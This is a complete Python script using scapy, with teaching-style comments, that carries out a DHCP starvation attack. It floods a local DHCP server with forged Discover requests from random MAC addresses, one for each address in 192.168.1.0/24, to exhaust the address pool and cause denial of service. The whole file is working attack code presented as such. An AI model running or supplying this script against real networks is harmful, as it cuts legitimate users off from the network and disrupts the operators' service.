#!/usr/bin/python3
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import ipaddress
#  conf.checkIPaddr needs to be set to False. Answer will only be accepted by scapy when it is set to false.
#  When conf.checkIpaddr is set to False we do not require the IPs to be swapped to count as a response.
conf.checkIPaddr = False
possible_ips = [str(ip) for ip in ipaddress.IPv4Network('192.168.1.0/24')]
# Create a DHCP starvation attack.
# Create packets with unique bogus MAC Addresses and use them to ask for IP Addresses.
# This will lead to a Denial of Service Attack (DoS) as the DHCP server will not be able to give out more IP Addresses.

for ip_add in possible_ips:
    # RandMAC() creates random MAC Addresses.
    bog_src_mac = RandMAC()
    # Build DHCP Discover Packet
    # We need to send a packet that broadcasts random MAC Addresses. We assign the bogus MAC Address as the source MAC Address.
    broadcast = Ether(src=bog_src_mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")

    # For UDP -> sport is the random port of origin -> The server sends DHCP messages to UDP port 68 (Which is used for the DHCP Client / Bootstrap Protocol Client).
    # For UDP -> dport is the destination port -> The client sends DHCP messages to UDP port 67 (Which is used for the DHCP Server / Bootstrap Protocol Server).
    udp = UDP(sport=68, dport=67)
    # The opcode of 1 says that it is a boot request. The client hardware address is assigned a random MAC Address. BootP is the predecessor of DHCP.
    bootp = BOOTP(op=1,chaddr = bog_src_mac)
    # We want to send a DHCP discover message. This packet will ask for an IP Address from the DHCP server.
    dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "192.168.1.249"), ('end')])

    pkt = broadcast / ip / udp / bootp / dhcp

    # The DHCP operates on Layer 2 of the OSI model so we should use sendp to send the segment.
    sendp(pkt,iface='eth0', verbose=0)
    # Send out a new packet every 0.4 seconds
    sleep(0.4)
    print(f"Sending packet - {ip_add}")
